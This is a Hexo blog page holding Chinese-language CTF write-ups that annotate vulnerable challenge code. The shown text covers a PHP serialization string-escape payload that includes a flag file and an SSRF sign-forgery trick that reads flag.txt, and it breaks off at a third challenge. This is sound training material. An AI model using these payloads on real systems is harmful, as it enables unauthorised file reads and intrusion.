

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="lionel">
  <meta name="keywords" content="">
  <meta name="description" content="ALL KINDS OF 1.BUUCTF—-WP1.[安洵杯 2019]easy_serialize_php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?php$fun">
<meta property="og:type" content="article">
<meta property="og:title" content="exercise">
<meta property="og:url" content="http://example.com/2022/02/13/exercise/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="ALL KINDS OF 1.BUUCTF—-WP1.[安洵杯 2019]easy_serialize_php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?php$fun">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-02-13T12:55:31.000Z">
<meta property="article:modified_time" content="2023-01-31T08:28:51.641Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp orz">
<meta name="twitter:card" content="summary_large_image">
  
  <title>exercise - Hexo</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="exercise">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-02-13 20:55" pubdate>
        February 13, 2022 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      45k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      139 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">exercise</h1>
            
            <div class="markdown-body">
              <p>ALL KINDS OF</p>
<h1 id="1-BUUCTF—-WP"><a href="#1-BUUCTF—-WP" class="headerlink" title="1.BUUCTF—-WP"></a>1.BUUCTF—-WP</h1><h2 id="1-安洵杯-2019-easy-serialize-php"><a href="#1-安洵杯-2019-easy-serialize-php" class="headerlink" title="1.[安洵杯 2019]easy_serialize_php"></a>1.[安洵杯 2019]easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<span class="hljs-comment">#获取一个参数</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<span class="hljs-comment">#将数组中出现过的替换为空</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br>extract(<span class="hljs-variable">$_POST</span>);<span class="hljs-comment">#这里有一个变量覆盖，前面SESSION中的所有的键值都会清空，从而只看post提交的</span><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><br><br><span class="hljs-comment">#这里先进行传参后序列化，再过滤，看filter函数，正则替换为空，导致这里序列化缩短漏洞</span><br><br><br><span class="hljs-comment">#---------------------------------------------------------------</span><br><span class="hljs-comment">#原理:因为序列化的字符串是严格的，对应的格式不能错，比如s:4:&quot;name&quot;,那s:4就必须有一个字符串长度是4的否则就往后要。</span><br><span class="hljs-comment">#并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。</span><br><span class="hljs-comment">#---------------------------------------------------------------</span><br><br><br><span class="hljs-comment">#----------------------------------------------------------------</span><br><span class="hljs-comment">#利用unserialize会把  &#125;  后面多余 的当垃圾处理 这里采用字符串逃逸的方式</span><br><span class="hljs-variable">$_SESSION</span>[phpflag]=<span class="hljs-string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc=&quot;;&#125;&#x27;</span>;<br><span class="hljs-comment">#首先  POST  传参</span><br>_SESSION[phpflag]=;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mbGxsbGxsYWc=&quot;</span>;&#125;<br><span class="hljs-comment">#并且  get   传参</span><br>?f=show_image<br><span class="hljs-comment">#解释post,在serialize($_SESSION)=</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">48</span>:<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;<br><span class="hljs-comment">#当phpflag被filter替换为空后，</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;    &quot;</span>;s:<span class="hljs-number">48</span>:   <span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;&#125;    &quot;</span>;&#125;<br><span class="hljs-comment">#   &quot;;s:48:  被当成一个键，值是  s:1:&quot;1&quot;;   ZDBnM19mMWFnLnBocA==  d0g3_f1ag.php的base64</span><br><span class="hljs-comment">#那么新的键值-----&gt;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;就出来了，从而可以包含文件</span><br><br><span class="hljs-comment">#访问页面发现   $flag = &#x27;flag in /d0g3_fllllllag&#x27;;</span><br><span class="hljs-comment">#于是继续包含   /d0g3_fllllllag  文件，base64后发现还是20个字符，所以不需要改字符多少，直接带入可以包含文件，拿到flag</span><br><span class="hljs-comment">#flag&#123;60d2d349-36a6-43c0-97f1-90165f3ee274&#125;</span><br><span class="hljs-comment">#---------------------------------------------------------------</span><br><span class="hljs-variable">$serialize_info</span> = filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-comment">#这里可以知道，我门需要设置	f=show_image  才能本地包含到文件</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>    <span class="hljs-comment">#这里的提示我们去查看phpinfo </span><br>    <span class="hljs-comment">#auto_append_file	d0g3_f1ag.php	d0g3_f1ag.php</span><br>    <span class="hljs-comment">#于是猜测flag应该在这个文件里面，需要包含这个文件</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = unserialize(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> file_get_contents(base64_decode(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="2-De1CTF-2019-SSRF-Me"><a href="#2-De1CTF-2019-SSRF-Me" class="headerlink" title="2.[De1CTF 2019]SSRF Me"></a>2.[De1CTF 2019]SSRF Me</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br><br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):</span>  <span class="hljs-comment"># python的构造方法</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span>(<span class="hljs-params">self</span>):</span>  <span class="hljs-comment"># 定义的命令执行函数，此处调用了scan这个自定义的函数</span><br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-comment"># md5(secert_key + self.action + self.param).hexdigest() == self.sign</span><br>            <span class="hljs-comment"># md5(secert_key + self.action + self.param).hexdigest() == hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:  <span class="hljs-comment"># action要写scan</span><br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)  <span class="hljs-comment"># 此处是文件读取得注入点</span><br>                <span class="hljs-comment"># resp = urllib.urlopen(param).read()</span><br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp  <span class="hljs-comment"># 输出结果，但是这里不会真的回显，只是回显到计算机上的dos里面</span><br>                    tmpfile.write(resp)<span class="hljs-comment">#将flag.txt的内容写进result.txt</span><br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:  <span class="hljs-comment"># action要加read</span><br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):  <span class="hljs-comment"># !!!校验</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-comment"># md5(secert_key + param + action).hexdigest()</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-comment"># generate Sign For Action Scan.</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)  </span><span class="hljs-comment"># !!!这个路由用于测试</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span>():</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><span class="hljs-comment"># hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="hljs-comment"># hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)  </span><span class="hljs-comment"># 这个路由是我萌得最终注入点</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span>():</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)  </span><span class="hljs-comment"># 根目录路由，就是显示源代码得地方</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">param</span>):</span>  <span class="hljs-comment"># 这是用来扫目录得函数</span><br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span>(<span class="hljs-params">action, param</span>):</span>  <span class="hljs-comment"># !!!这个应该是本题关键点,此处注意顺序先是param后是action</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">content</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params">param</span>):</span>  <span class="hljs-comment"># 这个waf比较没用好像</span><br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br>    <br>    <br><span class="hljs-comment">#有两个地方可以传参：路由/geneSign和/De1ta</span><br><span class="hljs-comment">#/De1ta有task类，传参需要绕过waf，waf过滤掉gopher和file</span><br><span class="hljs-comment">#注意到返回return json.dumps(task.Exec())，所以我们最后是要观察Exec()</span><br><span class="hljs-comment">#		if (self.checkSign()):   再去观察此函数</span><br><span class="hljs-comment">#		等价带换为	hashlib.md5(secert_key + param + action).hexdigest() == self.sign而action，param，sign都是我们可以传参的，此处是参数值进行拼接的，很简单</span><br><span class="hljs-comment">#因为secert_key不知道，所以我们需要通过第一个路由、geneSign来得到，action已经固定，改变不了，这时只要我们第二个路由/De1ta的param+action传的参数等于第一个路由/geneSign的param传的参数+“scan”即可使hashlib.md5(secert_key + param + action).hexdigest() == self.sign这个等式成立，第一个判定即可通过</span><br><br><span class="hljs-comment">#产生sign的过程secert_key + param + scan，我们可以传入的secert_key + param + readscan</span><br><span class="hljs-comment">#所以payload1就需要有read后缀</span><br><span class="hljs-comment">#payload1=&#x27;/geneSign?param=flag.txtread&#x27;</span><br><span class="hljs-comment">#payload2=&#x27;/De1ta?param=flag.txt&#x27;</span><br><span class="hljs-comment">#cookie:action=readscan;sign=1241cbbc38cc28f8fd798a7aae459683(payload1的回显)</span><br><br></code></pre></td></tr></table></figure>

<h2 id="3-MRCTF2020-Ezpop"><a href="#3-MRCTF2020-Ezpop" class="headerlink" title="3.[MRCTF2020]Ezpop"></a>3.[MRCTF2020]Ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 